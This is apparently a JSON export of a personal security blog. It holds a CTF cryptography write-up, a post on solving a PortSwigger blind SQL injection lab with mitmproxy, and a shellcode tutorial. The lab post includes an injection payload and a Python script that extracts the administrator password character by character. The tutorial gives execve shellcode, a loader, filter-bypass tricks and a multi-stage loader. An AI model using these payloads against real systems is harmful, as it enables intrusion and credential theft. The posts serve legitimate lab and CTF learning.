{"about":{"slug":"about","filePath":"about.md","title":"About me","links":[],"tags":["explorer"],"content":"Hi, my name is Youssef and known online as iossefy. I have a passion for\nopensource, reverse engineering, pwn, building tools and experimenting new ideas.\nThis is the place where i occasionally share my notes, thoughts and\nwrite about topics that interest me. I am currently focused on pwn, with the\ngoal to become a Vulnerability Researcher and Exploit Developer.\nContact\nIf you have a question, or a comment or —if you just want to say\nhello— please do so. You can find me on\nTwitter.\nFind me on Github\n"},"blog/en/ascwg-2022":{"slug":"blog/en/ascwg-2022","filePath":"blog/en/ascwg-2022.md","title":"Arab Security Cyber WarGames 2022","links":[],"tags":["ctf","writeup","ascwg"],"content":"OSP Challenge\n\nHave you heard of OTP? This is OSP (One Secret Password).\n\ngiven an osp.py that contains the following block of code.\nfrom Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long, isPrime\nfrom string import printable, ascii_letters\nfrom secret import FLAG\nimport os\n \nsecret = os.urandom(len(FLAG))\n \ndef OSP(plain, secret):\n    assert len(plain) == len(secret), &#039;The length has to be idenntical!&#039;\n    ct = []\n    p = getPrime(256)\n    for f, k in zip(FLAG, secret):\n        ct.append((f * p + k))\n    return ct, p\n \nct, p = OSP(FLAG, secret)\nprint(ct)\nAnd given a text file output.txt that contains the flag encrypted:\n5447072546591309544167389173397699795993168970119080464536675615517059887871841\n6955492636416595264090666175261678201037431146459748900869908862891014933743799\n5614674778794119068603308840271475174331420323045821401907034865225277115190905\n7290697100822214312962505509009228957713933852313230775610627362307449388382150\n5949879243199738117475148174019025931007923028899303276647753364641711569829134\n10307537280472785752809059512737185767802458204994567648277093857055359480126320\n7290697100822214312962505509009228957713933852313230775610627362307449388382014\n8715316074546095270667822677436319673589070352190528743258680984827295820594564\n4357658037273047635333911338718159836794535176095264371629340492413647910297392\n4609061385577261921987790839028822904301912205485375777684879366975973751276187\n7961106029633452410706184176504330471066939264020194525092064361140318297658489\n4106254688968833348680031838407496769287158146705152965573801617851322069318627\n8547713842343285746231903010562544295250818999263787805888321735119078593275661\n7961106029633452410706184176504330471066939264020194525092064361140318297658510\n4106254688968833348680031838407496769287158146705152965573801617851322069318692\n4609061385577261921987790839028822904301912205485375777684879366975973751276175\n3268243527954785726500433504038619877595901382071448278722005369310235932723134\n9637128351661547655065380845242084254449452793287603898795656858222490570849839\n7961106029633452410706184176504330471066939264020194525092064361140318297658493\n6536487055909571453000867008077239755191802764142896557444010738620471865445985\n4022453572867428586462072004970609080118032470241782496888621992997213455659123\n4609061385577261921987790839028822904301912205485375777684879366975973751276211\n7961106029633452410706184176504330471066939264020194525092064361140318297658707\n5363271430489904781949429339960812106824043293655709995851495990662951274212211\n7961106029633452410706184176504330471066939264020194525092064361140318297658649\n6704089288112380977436786674951015133530054117069637494814369988328689092765262\n9553327235560142892847421011805196565280327116824233430110477233368381957190188\n4106254688968833348680031838407496769287158146705152965573801617851322069318653\n6452685939808166690782907174640352066022677087679526088758831113766363251786487\n4273856921171642873115951505281272147625409499631893902944160867559539296637772\n2765436831346357153192674503417293742581147323291225466610927620185584250765693\n3771050224563214299808192504659946012610655440851671090833083118434887614680427\n8547713842343285746231903010562544295250818999263787805888321735119078593275529\n4022453572867428586462072004970609080118032470241782496888621992997213455659182\n8547713842343285746231903010562544295250818999263787805888321735119078593275562\n8547713842343285746231903010562544295250818999263787805888321735119078593275594\n8128708261836261935142103843378105849405190616946935462462423610848535524977837\n4273856921171642873115951505281272147625409499631893902944160867559539296637945\n4525260269475857159769831005591935215132786529022005308999699742121865137616416\n4441459153374452397551871172155047525963660852558634840314520117267756523956886\n4609061385577261921987790839028822904301912205485375777684879366975973751276006\n8463912726241880984013943177125656606081693322800417337203142110264969979616102\n10475139512675595277244979179610961146140709557921308585647453106763576707445416\n\nMy approach solving the challange\nfirst thing i do is i try to collect as much information as possible from the\ngiven code.  by looking at output.txt you can see that most of the lines are\nof length 79. while there are two lines that differs from the rest, they have\nthe length of 80.\nthe function OSP(plain, secret) takes byte array (b”array”)\nand secret (random bytes with the length equals to the flag’s length) and\nreturns the used prime number and ct\ndef OSP(plain, secret):\n    assert len(plain) == len(secret), &#039;The length has to be idenntical!&#039;\n    ct = []\n    p = getPrime(256)\n    for f, k in zip(FLAG, secret):\n        ct.append((f * p + k))\n    return ct, p\nby just looking you can identify the most important part in it.\n#...\np = getPrime(256)\nfor f, k in zip(FLAG, secret):\n    ct.append((f * p + k))\n#...\nTrying the OSP() function to see how it works.\nFLAG = b&#039;A&#039;\nsecret = os.urandom(len(FLAG))\n \nct, p = OSP(FLAG, secret)\nf is the ord(‘A’), p is a prime number and k is a random byte and it will\nresult in\n56935293674359....900212209796131672\nof length 79 now i know where is the 79 chars came from.\ni wrote this function to decrypt needing only the prime number.\nBy just doing the opposite of what the encrypt function is doing.\n# decrypts and returns ASCII char\ndef decrypt(ctx, prime) -&gt; int:\n    return int((ctx-len(str(ctx)))/prime)\nwhere ctx is f. len(str(ctx)) is k and prime is p from the OSP() function\nint(\n    (ctx - len(str(ctx) )) / prime\n )\n \ncalling this: decrypt(ct[0], p) returns 65 == ord(‘A’) which is our flag!\nthe method this encryption function get’s its prime number is by p = getPrime(N)\ni know the N. so i went on to bruteforce the prime number. and this is my code\nto do it.\nSolution\nfrom Crypto.Util.number import getPrime\n \n# as from the OSP() function\n# &gt;&gt; p = getPrime(256)\nBIT_LEN = 256\n \n# decrypts and returns ASCII char\ndef decrypt(ctx, prime) -&gt; int:\n    return int((ctx-len(str(ctx)))/prime)\n \n# read output.txt (encrypted data) file\nwith open(&quot;output.txt&quot;, &#039;r&#039;) as f:\n    out = f.readlines()\n    for i in range(len(out)):\n        out[i] = out[i].strip()\n \n# I know that the flag starts with ASCWG{\nflag_pfx = &quot;ASCWG{&quot;\n \ndef solve(prime) -&gt; str:\n    flag = &quot;&quot;\n    for i in range(len(out)):\n        flag += chr(decrypt(int(out[i]), prime))\n    return flag\n \np = getPrime(BIT_LEN)\nret = solve(p)\n \n# Bruteforce prime number\nwhile flag_pfx not in ret:\n    p = getPrime(BIT_LEN)\n    ret = solve(p)\n \nprint(f&quot;prime: {p}&quot;)\nprint(f&quot;flag length: {len(ret)}&quot;)\nprint(f&quot;flag: {ret}&quot;)\n$ python solve.py\nprime: 83614740067651512734468706.....00802220121111201\nflag length: 43\nflag: ASCWG{Wh47_1f_17&#039;s_N07_@_Pr1M3!-f0ffa3657e}\n"},"blog/en/first-post":{"slug":"blog/en/first-post","filePath":"blog/en/first-post.md","title":"First post","links":[],"tags":["misc"],"content":"Hi.\nlet’s talk about the website.  i probably know what you are thinking\nabout, “This website is ugly, looks like the websites from the 90s?”.\nthis website is designed to be minimal without sacrificing basic\nfunctionality.  website is lightweight so it loads fast, fits on all\nyour screens and looks the same in all of your browser. that’s good\nbecause users will not get distracted and take what they want and\njust go away. plus i am not a web designer and i am bad with\ncolors and that’s a reason why i choose it to be this way.\nabout the content, well… that’s my personal website. i write my\nthoughts, opinions, something new i learned and etc…"},"blog/en/index":{"slug":"blog/en/index","filePath":"blog/en/index.md","title":"Posts","links":[],"tags":[],"content":""},"blog/en/mitmproxy-burpsuite":{"slug":"blog/en/mitmproxy-burpsuite","filePath":"blog/en/mitmproxy-burpsuite.md","title":"Using mitmproxy instead of burpsuite? (exploring a blind sqli portswigger lab)","links":[],"tags":["mitmproxy","burpsuite","portswigger","blind-sql-injection"],"content":"PortSwigger made a powerful tool burpsuite for performing security testing of\nweb applications.  in its community edition it includes tools like repeater,\ndecoder/encoder, burp intruder which helps in modifying http requests and study\nits behaviour.\nmitmproxy is a free opensource interactive https proxy. its features includes\nintercepting HTTP &amp; HTTPS requests, save http conversations for later replay\nanalysis, make scripted changes for http traffic using python\nfor whatever reason, i will try using mitmproxy to solve a blind sql inejection\nvulnerability using mitmproxy. the lab description goes like.\nthe goal here is to try to solve this challenge by using mitmproxy and not\nburpsuite, python scripting is permitted of course.\nChallenge description\n\nThis lab contains a blind SQL injection vulnerability. The application uses a\ntracking cookie for analytics, and performs an SQL query containing the value\nof the submitted cookie.  The results of the SQL query are not returned, and\nthe application does not respond any differently based on whether the query\nreturns any rows. If the SQL query causes an error, then the application\nreturns a custom error message.  The database contains a different table\ncalled users, with columns called username and password. You need to exploit\nthe blind SQL injection vulnerability to find out the password of the\nadministrator user.  To solve the lab, log in as the administrator user.\n\nexploring mitmproxy\nafter setting up the browser, and opening mitmproxy i will make a get request to / using the browser.\nlooking at mitmproxy i see a lot of requests.\n\na lot of them are just images (svg,png,etc…). i don’t need those on my screen\nso i will filter them using mitmproxy&#039;s filter expressions\njust by pressing the f key, at the bottom it will prompt you to inter a filter expression.\n\nyou can get filter expressions list by pressing ? key\n\ni found the following\n~c              status code\n~u regex        URL\n!               unary not\n&amp;               and\n|               or\n(...)           grouping\n\ni can filter the images by: set view_filter &#039;!(~u /image)&#039;\n\ni still see a problem. i want to focus on just one domain the domain of the challenge.\nusing the following solves the issue\nset view_filter &#039;web-security-academy.net &amp; !(~u /image)&#039;\nplaying with it i found this to filter all unwanted requests.\n~u web-security-academy.net &amp; !(~u /image | ico | css)\n\n\nyou can intercept requests by pressing i and use filter expressions to\nselect which requests you want to intercept and which ones to ignore. by using\n~q you intercept all request. but we don’t need that now so ignore this\nnow i will press z to clear all flows and make a new request with the\nbrowser. i’ll select the first request.\n\nlet’s try to see if the cookie TrackingId=iubY1Hw83n9Ea9m2; is vulnerable to sqli.\ni will just append a single quote to it at the end.\npress e to edit the request and then press 1 to edit the cookies.\n\nCookie: TrackingId=iubY1Hw83n9Ea9m2&#039;\n\nafter finishing press escape to return to the request and then press r to replay the request.\nit did respond with error 505 internal server error\n\nThe goal of this blog post is not to write a writeup about how to exploit this\nblind sql vulnerability.  its goal is to try using mitmproxy as an alternative\nto burpsuite and see it it makes that diffirence.  you can read the solution\nhere on portswigger web security academy.\nafter going through the challenge. to get the password you have this query where\nxyz is your cookie and SUBSTR(password,1,1)=&#039;A&#039; is guessing the password\ncharacter by character.\nTrackingId=xyz&#039;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#039;A&#039; THEN TO_CHAR(1/0) ELSE &#039;&#039; END FROM users WHERE username=&#039;administrator&#039;)||&#039;\n\nin portswigger’s writeup they used burp intruder to automate the process. but unfortunately mitmproxy has no similar feature so i wrote python script to do it for me.\n#!/usr/bin/env python\nimport requests, urllib3\nfrom string import ascii_lowercase, digits\nimport time\n \nurllib3.disable_warnings()\n \n# your challenge url\nurl = &quot;your-challenge-url.web-security-academy.net/&quot;\n \nproxies = {\n    &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;\n}\n \nreq = requests.Session()\n \nabc123 = ascii_lowercase + digits\n \n# Your cookie here\nheaders = {&quot;Cookie&quot;: &quot;TrackingId=xyz&quot;}\n \ndef make_query(c: str, count: int = 1) -&gt; str:\n    return f&quot;&#039;||(SELECT CASE WHEN SUBSTR(password,1,{count})=&#039;{c}&#039; THEN to_char(1/0) ELSE &#039;&#039; END FROM users WHERE username=&#039;administrator&#039;)||&#039;&quot;\n \npass_len = 20\n \ndef solve() -&gt; str:\n    j = &#039;&#039;\n    count = 1\n    while len(j) != pass_len:\n        for i in abc123:\n            cookie = headers[&#039;Cookie&#039;]+make_query(j+i, count)\n            H = {&quot;Cookie&quot;: cookie}\n            print(f&quot;Trying: {H[&#039;Cookie&#039;]}&quot;)\n            x = req.get(url,\n                        headers=H,\n                        proxies=proxies,\n                        verify=False)\n            if x.status_code == 500:\n                count += 1\n                j += i\n                print(f&quot;[+] Found: {i}&quot;)\n                print(j)\n                continue\n    return j\n \nprint(f&quot;administrator:{solve()}&quot;)\ni add this part to pass all the requests on mitmproxy to see how is everything going.\nproxies = {\n    &quot;https&quot;: &quot;http://127.0.0.1:8080&quot;\n}\nthe script output goes like\nTrying: TrackingId=xyz&#039;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#039;a&#039; THEN to_char(1/0) ELSE &#039;&#039; END FROM users WHERE username=&#039;administrator&#039;)||&#039;\nTrying: TrackingId=xyz&#039;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#039;b&#039; THEN to_char(1/0) ELSE &#039;&#039; END FROM users WHERE username=&#039;administrator&#039;)||&#039;\nTrying: TrackingId=xyz&#039;||(SELECT CASE WHEN SUBSTR(password,1,1)=&#039;c&#039; THEN to_char(1/0) ELSE &#039;&#039; END FROM users WHERE username=&#039;administrator&#039;)||&#039;\n[+] Found: c\n\nTrying: TrackingId=xyz&#039;||(SELECT CASE WHEN SUBSTR(password,1,2)=&#039;cd&#039; THEN to_char(1/0) ELSE &#039;&#039; END FROM users WHERE username=&#039;administrator&#039;)||&#039;\n\n...\n...\n...\n\nadministrator:cwok4lewga8jbhkodnb6\n\n\nnow let’s see how mitmproxy is doing.\n\nusing a filter expression\n~u web-security-academy.net &amp; !(~u /image | ico | css) &amp; ~c 500\n\nadding ~c 500 to filter the status code\n\nConclusion\nburpsuite\nburpsuite is a very powerful tool with many features\n\neasy to use\nbeginner friendly GUI\nhas a lot of tools built-in\nit’s meant for web application security\nburp scanner (Professional edition)\n\nmitmproxy\nyou can replace burpsuite with mitmproxy but you will have to give up many burp advantages.\nif you are going to use mitmproxy you will have to\n\ndo everything manually\nwrite scripts to automate tasks\nLearn mitmproxy’s interface\nuse other tools (like sqlmap for example) along side with mitmproxy to do automated scanning.\n"},"blog/en/shellcode-notes":{"slug":"blog/en/shellcode-notes","filePath":"blog/en/shellcode-notes.md","title":"Shellcode 101: The notes i wish existed when i started learning shellcode","links":[],"tags":["ctf","shellcode"],"content":"I have faith of who ever reading this article is not a layman, you are probably\nfamiliar with CTFs, overflowed the buffer and smashed the stack once, and\nknowing what you are getting your self into. I assume you know what a CTF challenge is, x86 assembly basics, and using linux.\nThe term “shellcode” originates from the common objective of an exploit usually\nto execute a command shell /bin/sh. the code is written in an assembly\nlanguage.\n#execve(&quot;/bin/bash&quot;,{NULL},{NULL})\n.text\n.global _start\n_start:\n    mov rax, 0x68732f6e69622f\n    push rax\n    push rsp\n    pop rdi\n    xor eax, eax\n    push rax\n    mov al, 59\n    push rsp\n    pop rdx\n    push rsp\n    pop rsi\n    syscall\nLooking at his code for a first time is intimidating, and scary. but once you\nlearn how to read it, writing the shellcode would be the easiest part of the job.\nHow does it execute\nshellcode is simply executable bytes, it is a machine instructions assembled\nto perform a small task once control is hijacked.\nIn today’s computers, there are two architectures, Von Neumann, which sees\nand stores code as data. And Harvard architectures that stores data and code\nseparately.\nalmost all general purpose architectures (x86, ARM, MIPS, etc..) are Von\nNeumann. That would be the focus of this article.\nStarting out, we will use a simple shellcode loader to test and execute our\nshellcode.\n#include &lt;stdio.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;unistd.h&gt; // for read()\n \nint main(void) {\n    // 1. Allocate an executable memory page.\n    //    PROT_READ | PROT_WRITE | PROT_EXEC: The memory can be read, written to, and executed.\n    //    MAP_PRIVATE | MAP_ANON: The mapping is private to this process and not backed by a file.\n    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);\n \n    if (page == MAP_FAILED) {\n        perror(&quot;mmap failed&quot;);\n        return 1;\n    }\n \n    printf(&quot;[+] Memory allocated at: %p\\n&quot;, page);\n \n    // 2. Read shellcode from standard input (stdin) into the allocated page.\n    printf(&quot;[+] Reading shellcode from stdin...\\n&quot;);\n    ssize_t bytes_read = read(STDIN_FILENO, page, 4095);\n \n    if (bytes_read &lt;= 0) {\n        perror(&quot;read failed or no input provided&quot;);\n        return 1;\n    }\n \n    printf(&quot;[+] Read %ld bytes. Executing now...\\n&quot;, bytes_read);\n \n    // 3. Create a function pointer to the page and call it.\n    //    This transfers execution to the shellcode.\n    void (*shellcode_func)() = page;\n    shellcode_func();\n \n    // This line will likely not be reached if the shellcode exits.\n    return 0;\n}\nShellcode is just bytes. If you want to execute it, those bytes must live in\nmemory marked as executable.\nthe mmap call is important, if we requested a memory without PROT_EXEC The\nmoment the program tried to execute the code at page, the CPU’s memory\nmanagement unit would see the “No-Execute” permission on that memory page and\ntrigger a protection fault, resulting in a SIGSEGV.\nWe are asking for a single page (0x1000 bytes) of memory that is\n\nWritable: we load shellcode bytes into it using read\nExecutable: the CPU will happily jmp into it without complaining.\n\nvoid *page = mmap(\n    NULL,                // Let the kernel choose the address\n    4096,                // One page = 4096 bytes (common page size)\n    PROT_READ | PROT_WRITE | PROT_EXEC, // Permissions: read, write, execute\n    MAP_PRIVATE | MAP_ANON, // Private mapping, not backed by a file\n    -1,                  // File descriptor (-1 since it&#039;s anonymous)\n    0                    // Offset (not used here)\n);\nThe code is not compiled using the default gcc configuration, by default,\nmodern compilers have protection against shellcode, you need to disable when\ncompiling the program.\ngcc -ggdb -g3 execute.c -fno-stack-protector -z execstack -no-pie -fno-pie -o execute\n\nUsing checksec, we see the Stack: Executable. That means that the data on the\nstack could be treated as code.\n$ pwn checksec --file=execute\n[*] &#039;/tmp/test/execute&#039;\n    Arch:       amd64-64-little\n    RELRO:      Full RELRO\n    Stack:      No canary found\n    NX:         NX unknown - GNU_STACK missing\n    PIE:        No PIE (0x400000)\n    Stack:      Executable\n    RWX:        Has RWX segments\n    SHSTK:      Enabled\n    IBT:        Enabled\n    Stripped:   No\n    Debuginfo:  Yes\n\nWriting Shellcode\nBefore i start to write shellcode, i open loads documentation, syscall tables,\nand the manual for whatever assembly architecture i am writing. To mention a\nfew, I use the Systrack: Linux kernel syscall\ntables for system calls\nlookups. And felix cloutier’s x86 and amd64 instruction\nreference, It’s easier to navigate, but the\noffical intel manual also works.\nWhen writing shellcode, your goal is to execute Syscalls. Syscalls = system calls.\nThey’re the special functions your program uses to talk to the kernel.\n\nread to ask kernel to read from a file.\nwrite to ask kernel to write to a file.\nexecve to ask the kernel to run another program.\nexit to tell kernel you’re done and exit cleanly.\n\nSyscalls are functions, like any other functions, the take parameters. It is not\nas easy as function(arg1, arg2, arg3), but you learn to do it.\nCall convention for x86 and x86_64 architechtures:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nARCHRETURNARG0ARG1ARG2ARG3ARG4ARG5x86eaxebxecxedxesiediebpx64raxrdirsirdxr10r8r9\nTo execute shellcode, You lookup the syscall number you want, the simplist\nexample is exit() syscall, looking it up in a man page you find this\ndefinition\nexit - cause normal process termination\n\n#include &lt;stdlib.h&gt;\n\n[[noreturn]] void exit(int status);\n\nIt takes only one parameter, exit status. On unix-like systems, a successful\nexit is exit(0), so lets write that in shellcode. Never mind the first 3\nlines, they are important for the compiler not for us for this case.\n.intel_syntax noprefix\n \n.global _start\n \n_start:\n    mov rax, 60      # syscall for exit\n    syscall          # execute the shellcode\nCompile the shellcode using the following.\ngcc -nostdlib -static hello.S -o hello.elf\n\nThis will create an elf file, inspect it and see the disassembly code.\nobjdump.\n$ objdump -d -Mintel hello.elf\n\nhello.elf:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000401000 &lt;_start&gt;:\n  401000:   48 c7 c0 3c 00 00 00   mov    rax,0x3c\n  401007:   0f 05                  syscall\n\nWe only want the .text section of the elf file. to extract it use objdump\nobjcopy --dump-section .text=hello.bin hello.elf\n\nUse xxd to get compiled code\n$ xxd hello.bin\n00000000: 48c7 c078 0000 00bb 0200 0000 4831 db6a  H..x........H1.j\n00000010: 785f                                     x_\nYou can run the elf file just like any other linux program. it exits with\nstatus 0, to check the status echo $?.\n./hello.elf\necho $?\n# 0\nFor more logging use strace to see the syscalls get executed.\nstrace ./hello.elf\n# execve(&quot;./hello.elf&quot;, [&quot;./hello.elf&quot;], 0x7ffe3fbd8560 /* 73 vars */) = 0\n# exit(0)                                 = ?\n# +++ exited with 0 +++\nNow enough with long introduction, Lets get into the notes.\nProblems you would run into when writing shellcode\nHere are some of the common problems that you will run into eventually when you\nare writing shellcode.\nSize constraints (Byte budget hell)\nYour goal is to use the smallest number of bytes as possible.\nXOR Instruction\nBe careful of using mov too much. To zero out a register, do not use the\ninstruction mov. Use xor instead.\nmov    al,0x0       ; b0 00\nmov    ax,0x0       ; 66 b8 00 00\nmov    eax,0x0      ; b8 00 00 00 00\nmov    rax,0x0      ; 48 c7 c0 00 00 00 00\n \nxor    al,al        ; 30 c0\nxor    ax,ax        ; 66 31 c0\nxor    eax,eax      ; 31 c0\nxor    rax,rax      ; 48 31 c0\nPush Pop\npush something to the stack, and get it back by using pop\n;; 7 bytes\nmov rax, 0xbadc0de      ; 48 c7 c0 de c0 ad 0b\n \n;; 6 bytes\npush   0xbadc0de        ; 68 de c0 ad 0b\npop    rax              ; 58\nUse what you have\nWhen you hijack the control flow of the code (e.g jmp rax) you may already\nhave some values stored at the registers. for example, when using the read\nsyscall, and rdx has a non-zero value. Use it as it is as the parameter\ncount. It is a sitiuation dependent but you get the point.\nStrings\nIf you think strings are hard in C, well let me introduce you to x86_64.\nI will use open syscall as an example.\n# open(&quot;/flag&quot;, O_RDONLY)\nmov rbx, 0x67616c662f           # push /flag filename\npush rbx\nmov rax, 2                      # open() syscall\nmov rdi, rsp                    # point to first item on stack (&quot;/flag&quot;)\nmov rsi, 0                      # NULL the second arg (O_RDONLY)\nsyscall                         # open(&quot;/flag&quot;, NULL)\nThis 0x67616c662f is /flag. it’s in little endian. to reproduce it you have\nto run the following command.\necho -ne &quot;/flag&quot; | rev | xxd -p\n# 67616c662f\nThe down side is you will struggle with long\nstrings as it may not fit in the registers. One other way using labels, I prefer this way but it may not always work.\n# open(&quot;/flag&quot;, O_RDONLY)\npush 2\npop rax             # open syscall = 2\n \nlea rdi, [rip+flag]     # flag string\nxor rsi, rsi        # O_RDONLY = 0\n \nsyscall\n \nflag:\n  .string &quot;/flag&quot;\nThere is also building the string on the stack. almost always work, but it\nrequires lots of work.\n# open(&quot;/flag&quot;, O_RDONLY)\n# push &quot;flag&quot; little endian to stack\npush 0x67616C66\npop  rax                        # rax = 0x0000000067616C66\n \n# shift left 8 bits to make room for the &#039;/&#039; byte\nshl  rax, 8                     # rax = 0x00000067616C6600\n# load &#039;/&#039; (0x2F) into rbx using push/pop\npush 0x2F\npop  rbx                        # rbx = 0x...0000002F\n \n# OR the &#039;/&#039; into the low byte\nor   rax, rbx                   # rax = 0x00000067616C662F\n# push the 64-bit qword (stack gets &quot;/flag\\0\\0\\0&quot; in little-endian)\npush rax\n \npush 2                          # open syscall\npop rax\n \nlea rdi, [rsp]                  # filename = &quot;/flag&quot;\nxor rsi, rsi                    # mode_t = O_RDONLY\n \nsyscall\nInput filtering\nInput maybe manipulated, filtered of some bytes before execution.\nString termination &amp; \\x00ull  bytes\nOne great resource i found is\nnets.ec/Shellcode/Null-free which has\nmany great examples.\n\nUse xor instruction instead of mov\n\nThis will use less bytes and not include null bytes.\n# bad\nmov rax, 0\n \n# good\nxor rax, rax\n\nUse push and pop instructions instead of mov\n\npush 0x70\npop rax\nsyscall\n\nUse shifting instructions\n\nmov     rdi, 0x68732f6e69622f6a   ; move the 64-bit immediate into RDI (&#039;hs/nib/j&#039; in little-endian)\nshr     rdi, 8                    ; logical right-shift RDI by 8 bits -&gt; zero-terminates the low byte\npush    rdi                       ; push the 64-bit value (now contains &quot;/bin/sh\\0&quot; when viewed as bytes)\npush    rsp                       ; push current RSP (stack pointer)\npop     rdi                       ; pop that value into RDI -&gt; RDI points at the pushed string\nSelf modifying shellcode\nOne time i was solving a ctf challenge, and it filters the syscall bytes\n0F 05. I wrote a shellcode that constructs the syscall bytes 0F 05 at\nruntime so it won’t be filtered. The following code increments the 0e by 1, so\nit becomes 0F and this way it bypasses the filter.\ninc BYTE PTR [rip]\n.byte 0x0e, 0x05\nNOP Padding\nnop is an instruction that does nothing, sometimes you use it for padding,\naligning or whatever reason, it is useful.\n.global _start\n \n_start:\n    # Your code here\n    nop\n    nop\n    #...\n    nop\n \n    .fill 10, 1, 0x90    # 10 NOP instructions\n    # or\n    .rept 10\n        nop\n    .endr\n \n    # More code here\nMulti stage shellcode\nSome times there will be input filtering that it is impossible to write\nshellcode to do anything meaningful. One way to solve this problem is a multi\nstage shellcode. Write a stage 1 shellcode “Loader” that its job is to load\nanother shellcode. Only the stage 1 gets filtered.\npush 0\npush 0\npop rax         # read syscall\npop rdi         # stdin\n \npush rsp\npop rsi         # rsi = rsp (buffer)\n \npush 100\npop rdx\n \nsyscall\n \njmp rsp\nUse Pwntools when possible\nit has lots of functions that automates and eases the process of writing\nshellcode. sometimes you don’t need to write shellcode at all, it does it for\nyou. But first you have to understand how the magic works, if not you will\nwaste a lot of time. RTFM.\nPwn shellcraft\npwn shellcraft -l #List shellcodes\npwn shellcraft -l amd #Shellcode with amd in the name\npwn shellcraft -f hex amd64.linux.sh #Create in C and run\npwn shellcraft -r amd64.linux.sh #Run to test. Get shell\nPwn template\ni like to use pwn template command to generate a starting point for my\nchallenges.\nthen use the asm(&quot;&quot;) function to write the shellcode instead of compiling and\npassing it by hand through the shell.\nstage1 = asm(&quot;&quot;&quot;# shellcode loader&quot;&quot;&quot;)\nstage2 = asm(&quot;&quot;&quot;# actual shellcode&quot;&quot;&quot;)\n \nio.sendline(stage1)\npause(1)\nio.sendline(stage2)\n \nio.interactive()\nGDB Debugger\nUsing a debugger is essential. gdb is good but it lacks features, that is why i\nrecommend using pwndbg or gef with it. they help with visualisation and\nprovide functions that are useful for debugging.\ngdbscript = f&#039;&#039;&#039;\n \n# break points\n#...\n \nsource /opt/gef/gef.py\ncontinue\n&#039;&#039;&#039;\nReferences\n\nshell-storm.org/shellcode/index.html\npwn.college/program-security/program-security/\nwww.felixcloutier.com/x86/\nsyscalls.mebeim.net/\nwww.abatchy.com/2017/04/shellcode-reduction-tips-x86\nnets.ec/Shellcode/Null-free\nbook.hacktricks.wiki/en/binary-exploitation/basic-stack-binary-exploitation-methodology/tools/pwntools.html\n"},"index":{"slug":"index","filePath":"index.md","title":"Iossefy","links":[],"tags":[],"content":"\n  My name is iossefy.\n  I ♥ open source.\n"},"license":{"slug":"license","filePath":"license.md","title":"license","links":["/"],"tags":[],"content":"\n\tThis work by Youssef Hesham\n\tis licensed under\n\t\n\t\tCC BY-NC-SA 4.0\n\t\n\nBy “This work” i mean everything i write here, website favicon, etc… unless i\nsay otherwise."},"mirrors":{"slug":"mirrors","filePath":"mirrors.md","title":"Mirrors","links":[],"tags":[],"content":"Here I have all my websites listed.\nBlog\n\nyoussefy.com\nyoussefy.pages.dev\niossefy.github.io\n\n\n"},"tags/ctf":{"slug":"tags/ctf","filePath":"tags/ctf.md","title":"Tag: ctf","links":[],"tags":[],"content":""}}